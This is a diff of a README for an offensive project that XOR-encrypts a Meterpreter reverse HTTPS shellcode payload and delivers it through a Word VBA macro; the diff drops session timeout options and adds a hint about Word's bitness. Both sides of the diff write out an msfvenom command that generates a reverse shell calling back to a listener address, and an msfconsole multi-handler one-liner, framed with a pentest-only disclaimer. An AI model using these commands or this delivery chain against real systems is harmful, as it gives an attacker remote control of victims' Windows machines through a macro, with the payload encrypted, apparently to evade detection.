@@ -7,7 +7,7 @@ This project demonstrates how to encrypt a shellcode (revshell) payload for exec
 ### 1. Generate the Shellcode
 Use `msfvenom` to generate a reverse HTTPS payload in C# format:
 ```sh
-msfvenom -p windows/x64/meterpreter/reverse_https SessionExpirationTimeout=0 SessionCommunicationTimeout=0 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
 ```
 
 ### 2. Encrypt the Payload
@@ -20,7 +20,7 @@ Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with 
 ### 4. Setup Metasploit Listener
 Start Metasploit and configure the multi-handler:
 ```sh
-sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.142; set LPORT 443; set SessionExpirationTimeout 0; set SessionCommunicationTimeout 0; exploit"
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.142; set LPORT 443; exploit"
 ```
 
 ### 5. Execute the VBA Macro
@@ -33,6 +33,8 @@ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterp
 
 ### 6. Compatibility Note
 If Microsoft Word is running in 32-bit, the payload and handler must be adjusted for x86 compatibility by replacing `windows/x64/meterpreter/reverse_https` with `windows/meterpreter/reverse_https` in both the shellcode generation with msfvenom and the listener configuration in Metasploit.
+
+A useful hint is to check whether Microsoft Word on the DEV or TEST machine is running in 64-bit or 32-bit mode. 
 
 ## Disclaimer
 This project is intended for educational and authorized penetration testing purposes only. Unauthorized use is strictly prohibited.
